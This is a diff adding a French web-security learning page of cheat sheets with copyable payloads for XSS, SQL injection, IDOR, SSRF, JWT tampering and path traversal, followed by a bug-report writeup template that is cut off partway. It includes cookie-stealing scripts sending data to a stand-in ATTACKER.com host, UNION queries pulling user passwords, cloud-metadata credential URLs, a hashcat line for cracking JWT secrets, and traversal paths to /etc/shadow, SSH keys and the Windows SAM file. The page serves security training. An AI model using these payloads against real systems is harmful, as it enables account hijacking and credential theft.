@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cheat Sheets — WebSec Academy</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="pages.css">
+</head>
+<body>
+    <!-- NAVIGATION -->
+    <nav class="nav">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <span class="logo-icon">🛡️</span>
+                <span class="logo-text">WebSec Academy</span>
+            </a>
+            <button class="nav-toggle" onclick="toggleMenu()">☰</button>
+            <ul class="nav-links" id="navLinks">
+                <li><a href="index.html">Accueil</a></li>
+                <li><a href="roadmap.html">Roadmap</a></li>
+                <li><a href="javascript-essentials.html">JavaScript</a></li>
+                <li><a href="outils.html">Outils</a></li>
+                <li><a href="ressources.html">Ressources</a></li>
+                <li><a href="cheatsheets.html" class="active">Cheat Sheets</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- HERO -->
+    <header class="page-hero">
+        <div class="hero-icon">📋</div>
+        <h1>Cheat Sheets <span class="gradient-text">& Aide-Mémoire</span></h1>
+        <p class="hero-desc">
+            Références rapides pour les vulnérabilités courantes. Garde cette page en favoris!
+        </p>
+        
+        <!-- Quick nav -->
+        <div class="quick-nav">
+            <a href="#xss" class="quick-link">XSS</a>
+            <a href="#sqli" class="quick-link">SQLi</a>
+            <a href="#idor" class="quick-link">IDOR</a>
+            <a href="#ssrf" class="quick-link">SSRF</a>
+            <a href="#jwt" class="quick-link">JWT</a>
+            <a href="#lfi" class="quick-link">LFI/Path Traversal</a>
+            <a href="#template" class="quick-link">Template Writeup</a>
+        </div>
+    </header>
+
+    <!-- XSS CHEATSHEET -->
+    <section class="section" id="xss">
+        <div class="container">
+            <div class="cheatsheet-card">
+                <div class="cheatsheet-header">
+                    <span class="cheatsheet-icon">💉</span>
+                    <h2>XSS (Cross-Site Scripting)</h2>
+                </div>
+                
+                <div class="cheatsheet-body">
+                    <div class="payload-group">
+                        <h4>🧪 Test de base</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>🖼️ Event handlers (sans balise script)</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>📝 Dans un attribut HTML</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>" onmouseover="alert(1)
+' onfocus='alert(1)' autofocus='
+" autofocus onfocus="alert(1)
+javascript:alert(1)
+" onclick="alert(1)"</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>🔓 Bypass de filtres</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
+&lt;script&gt;alert`1`&lt;/script&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;img src=x onerror="alert(1)"&gt;
+&lt;img src=x onerror=alert&lpar;1&rpar;&gt;
+%3Cscript%3Ealert(1)%3C/script%3E</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>🍪 Vol de cookies (impact réel)</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>&lt;script&gt;fetch('https://ATTACKER.com/?c='+document.cookie)&lt;/script&gt;
+&lt;script&gt;new Image().src='https://ATTACKER.com/?c='+document.cookie&lt;/script&gt;
+&lt;script&gt;document.location='https://ATTACKER.com/?c='+document.cookie&lt;/script&gt;</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="cheatsheet-tips">
+                        <h4>💡 Tips</h4>
+                        <ul>
+                            <li>Toujours identifier le <strong>contexte</strong> (HTML, attribut, JS, URL)</li>
+                            <li>Tester avec <code>alert(document.domain)</code> pour prouver l'exécution</li>
+                            <li>Si <code>&lt;script&gt;</code> est filtré, essayer les event handlers</li>
+                            <li>Vérifier si les caractères <code>&lt; &gt; " '</code> sont encodés</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- SQL INJECTION CHEATSHEET -->
+    <section class="section section-dark" id="sqli">
+        <div class="container">
+            <div class="cheatsheet-card">
+                <div class="cheatsheet-header">
+                    <span class="cheatsheet-icon">🗄️</span>
+                    <h2>SQL Injection</h2>
+                </div>
+                
+                <div class="cheatsheet-body">
+                    <div class="payload-group">
+                        <h4>🔍 Détection</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>'
+''
+`
+')
+")
+')--
+')#
+'--
+'#
+-- -
+' OR '1'='1
+' OR '1'='1'--
+" OR "1"="1
+' OR 1=1--
+admin'--</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>🔢 Trouver le nombre de colonnes (UNION)</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>📊 Extraire des données (UNION)</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,version()--
+' UNION SELECT 1,database()--
+' UNION SELECT 1,user()--</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>⏱️ Blind SQLi (Time-based)</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>'; WAITFOR DELAY '0:0:5'--     (SQL Server)
+'; SELECT SLEEP(5)--            (MySQL)
+' AND SLEEP(5)--                (MySQL)
+' || pg_sleep(5)--              (PostgreSQL)
+'; SELECT pg_sleep(5)--         (PostgreSQL)</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>✅❌ Blind SQLi (Boolean-based)</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>' AND 1=1--    (true - page normale)
+' AND 1=2--    (false - page différente)
+' AND 'a'='a'--
+' AND 'a'='b'--
+' AND (SELECT 'a' FROM users LIMIT 1)='a'--</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="db-specific">
+                        <h4>🔧 Spécifique par base de données</h4>
+                        <div class="db-grid">
+                            <div class="db-item">
+                                <h5>MySQL</h5>
+                                <code>-- ou #</code><br>
+                                <code>version()</code><br>
+                                <code>database()</code>
+                            </div>
+                            <div class="db-item">
+                                <h5>PostgreSQL</h5>
+                                <code>--</code><br>
+                                <code>version()</code><br>
+                                <code>current_database()</code>
+                            </div>
+                            <div class="db-item">
+                                <h5>SQL Server</h5>
+                                <code>--</code><br>
+                                <code>@@version</code><br>
+                                <code>db_name()</code>
+                            </div>
+                            <div class="db-item">
+                                <h5>Oracle</h5>
+                                <code>--</code><br>
+                                <code>banner FROM v$version</code><br>
+                                <code>FROM dual</code>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- IDOR CHEATSHEET -->
+    <section class="section" id="idor">
+        <div class="container">
+            <div class="cheatsheet-card">
+                <div class="cheatsheet-header">
+                    <span class="cheatsheet-icon">🔓</span>
+                    <h2>IDOR / BOLA (Broken Access Control)</h2>
+                </div>
+                
+                <div class="cheatsheet-body">
+                    <div class="payload-group">
+                        <h4>🎯 Où chercher</h4>
+                        <ul class="check-list">
+                            <li>URLs avec IDs : <code>/user/123</code>, <code>/order/456</code></li>
+                            <li>Paramètres GET : <code>?id=123&user_id=456</code></li>
+                            <li>Body POST/PUT : <code>{"userId": 123}</code></li>
+                            <li>Headers : <code>X-User-ID: 123</code></li>
+                            <li>Cookies : <code>user_id=123</code></li>
+                            <li>Fichiers : <code>/files/report_123.pdf</code></li>
+                        </ul>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>🧪 Techniques de test</h4>
+                        <div class="code-block">
+                            <pre><code># Changer l'ID numérique
+/api/users/123 → /api/users/124
+
+# Changer l'UUID (si prévisible)
+/api/users/a1b2c3d4 → /api/users/a1b2c3d5
+
+# Changer le username
+/profile/john → /profile/admin
+
+# ID dans le body
+{"user_id": 123} → {"user_id": 124}
+
+# Double ID (bypass)
+/api/users/123?id=124
+
+# Array d'IDs
+{"ids": [123, 124, 125]}
+
+# Wildcard
+/api/users/*</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>🔄 Méthode de test</h4>
+                        <ol class="method-list">
+                            <li>Crée 2 comptes : <strong>User A</strong> et <strong>User B</strong></li>
+                            <li>Connecte-toi en User A</li>
+                            <li>Note tous les IDs/références de User A</li>
+                            <li>Essaie d'accéder aux ressources de User B</li>
+                            <li>Teste aussi avec un utilisateur non authentifié</li>
+                            <li>Teste les actions : voir, modifier, supprimer</li>
+                        </ol>
+                    </div>
+                    
+                    <div class="cheatsheet-tips">
+                        <h4>💡 Tips</h4>
+                        <ul>
+                            <li>Les IDs séquentiels sont plus faciles à exploiter</li>
+                            <li>Teste aussi l'<strong>accès vertical</strong> (user → admin)</li>
+                            <li>Vérifie les endpoints de modification/suppression, pas seulement lecture</li>
+                            <li>Les API sont souvent moins protégées que l'interface web</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- SSRF CHEATSHEET -->
+    <section class="section section-dark" id="ssrf">
+        <div class="container">
+            <div class="cheatsheet-card">
+                <div class="cheatsheet-header">
+                    <span class="cheatsheet-icon">🌐</span>
+                    <h2>SSRF (Server-Side Request Forgery)</h2>
+                </div>
+                
+                <div class="cheatsheet-body">
+                    <div class="payload-group">
+                        <h4>🎯 Cibles classiques</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code># Localhost
+http://127.0.0.1
+http://localhost
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://127.0.0.1:8080
+
+# AWS Metadata (très courant!)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Google Cloud Metadata
+http://metadata.google.internal/computeMetadata/v1/
+
+# Réseau interne
+http://192.168.0.1
+http://10.0.0.1
+http://172.16.0.1</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>🔓 Bypass de filtres</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code># Encodages alternatifs de 127.0.0.1
+http://2130706433        (decimal)
+http://0x7f000001        (hex)
+http://0177.0.0.1        (octal)
+http://127.1
+http://127.0.1
+http://0.0.0.0
+http://0
+
+# Bypass avec redirection
+http://attacker.com/redirect?url=http://127.0.0.1
+
+# DNS rebinding
+http://127.0.0.1.nip.io
+http://spoofed.burpcollaborator.net
+
+# URL encoding
+http://127.0.0.1%2523@attacker.com
+http://attacker.com%2523@127.0.0.1</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>📍 Où chercher</h4>
+                        <ul class="check-list">
+                            <li>Import d'URL (images, fichiers, webhooks)</li>
+                            <li>Prévisualisation de liens</li>
+                            <li>PDF generators</li>
+                            <li>Paramètres <code>url=</code>, <code>src=</code>, <code>dest=</code></li>
+                            <li>Intégrations tierces (Slack, Discord webhooks)</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- JWT CHEATSHEET -->
+    <section class="section" id="jwt">
+        <div class="container">
+            <div class="cheatsheet-card">
+                <div class="cheatsheet-header">
+                    <span class="cheatsheet-icon">🔑</span>
+                    <h2>JWT (JSON Web Tokens)</h2>
+                </div>
+                
+                <div class="cheatsheet-body">
+                    <div class="payload-group">
+                        <h4>🔍 Structure d'un JWT</h4>
+                        <div class="jwt-structure">
+                            <code><span class="jwt-header">header</span>.<span class="jwt-payload">payload</span>.<span class="jwt-signature">signature</span></code>
+                            <p>Chaque partie est encodée en Base64URL</p>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>⚔️ Attaques courantes</h4>
+                        
+                        <h5>1. Algorithm None</h5>
+                        <div class="code-block">
+                            <pre><code># Changer l'algorithme en "none"
+{"alg": "none", "typ": "JWT"}
+
+# Supprimer la signature
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</code></pre>
+                        </div>
+                        
+                        <h5>2. Changer RS256 → HS256</h5>
+                        <div class="code-block">
+                            <pre><code># Si le serveur accepte HS256, signer avec la clé publique
+# La clé publique devient le secret HMAC</code></pre>
+                        </div>
+                        
+                        <h5>3. Weak secret (brute force)</h5>
+                        <div class="code-block">
+                            <pre><code># Avec hashcat
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+
+# Secrets courants à tester
+secret
+password
+123456
+jwt_secret</code></pre>
+                        </div>
+                        
+                        <h5>4. Modifier le payload</h5>
+                        <div class="code-block">
+                            <pre><code># Changer le rôle
+{"user": "john", "role": "user"} → {"user": "john", "role": "admin"}
+
+# Changer l'ID
+{"sub": "123"} → {"sub": "1"}</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>🛠️ Outils</h4>
+                        <ul class="tool-list">
+                            <li><a href="https://jwt.io" target="_blank">jwt.io</a> — Décoder/encoder JWT</li>
+                            <li><a href="https://github.com/ticarpi/jwt_tool" target="_blank">jwt_tool</a> — Tests automatisés</li>
+                            <li>Extension Burp "JSON Web Tokens"</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- LFI / PATH TRAVERSAL -->
+    <section class="section section-dark" id="lfi">
+        <div class="container">
+            <div class="cheatsheet-card">
+                <div class="cheatsheet-header">
+                    <span class="cheatsheet-icon">📂</span>
+                    <h2>LFI / Path Traversal</h2>
+                </div>
+                
+                <div class="cheatsheet-body">
+                    <div class="payload-group">
+                        <h4>🧪 Payloads de base</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+..%252f..%252f..%252fetc/passwd
+....\/....\/....\/etc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>📁 Fichiers intéressants (Linux)</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/proc/self/environ
+/proc/self/cmdline
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/home/user/.ssh/id_rsa
+/home/user/.bash_history
+~/.ssh/authorized_keys</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>📁 Fichiers intéressants (Windows)</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copier</button>
+                            <pre><code>C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\Windows\System32\config\SAM
+C:\Users\Administrator\Desktop\
+C:\inetpub\wwwroot\web.config
+C:\xampp\apache\conf\httpd.conf</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-group">
+                        <h4>🔓 Bypass null byte (ancien)</h4>
+                        <div class="code-block">
+                            <pre><code>../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd\0</code></pre>
+                        </div>
+                        <p class="note">⚠️ Ne fonctionne plus sur les versions modernes de PHP (< 5.3.4)</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- TEMPLATE WRITEUP -->
+    <section class="section" id="template">
+        <div class="container">
+            <div class="cheatsheet-card template-card">
+                <div class="cheatsheet-header">
+                    <span class="cheatsheet-icon">📝</span>
+                    <h2>Template de Writeup</h2>
+                    <button class="copy-btn-large" onclick="copyTemplate()">Copier le template</button>
+                </div>
+                
+                <div class="cheatsheet-body">
+                    <div class="template-block" id="writeup-template">
+                        <pre><code># [Titre de la vulnérabilité]
+
+## Informations
+- **Cible:** [URL/Application]
+- **Type:** [XSS/SQLi/IDOR/etc.]
+- **Sévérité:** [Critical/High/Medium/Low]
+- **Date:** [YYYY-MM-DD]
+
+## Résumé
+[2-3 phrases décrivant la vulnérabilité et son impact]
+
+## Description technique
+[Explication détaillée de la faille]
+
+## Étapes de reproduction
+1. Aller sur [URL]
+2. [Action 1]
+3. [Action 2]
+4. Observer [résultat]
+
+## Payload utilisé
